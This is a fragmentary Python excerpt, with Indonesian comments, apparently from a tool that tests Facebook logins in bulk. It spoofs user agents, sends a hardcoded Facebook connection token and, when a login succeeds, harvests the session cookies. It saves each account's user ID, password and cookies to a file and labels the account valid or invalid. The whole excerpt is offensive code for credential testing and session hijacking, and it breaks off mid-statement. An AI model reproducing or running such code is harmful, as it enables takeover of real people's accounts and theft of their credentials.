    ...
    "User-Agent": str(random.choice([
        ...
        "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
            ...
            if 'session_key' in res:
                ...
                # ============ AMBIL COOKIES ==============
                cookies = res.get("session_cookies", [])
                cookie_string = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                print(f"\033[92m🍪 COOKIES : {cookie_string}\033[0m")
                # =========================================

                # ============ AUTO SAVE COOKIES ==========
                try:
                    with open("cookies.txt", "a") as ck:
                        ck.write(f"{uid}|{pw}|{cookie_string}\n")
                except Exception as e:
                    print(f"\033[91mGagal menyimpan cookies: {e}\033[0m")
                # ==========================================

                # ============ STATUS VALID / INVALID ==========
                if cookie_string.strip() == "":
                    status = "INVALID"
                    print("\033[91m❌ STATUS : INVALID\033[0m")
                else:
                    status = "VALID"
                    print("\033[92m✔ STATUS : VALID\033[0m")

                with open("status.txt", "a") as st:
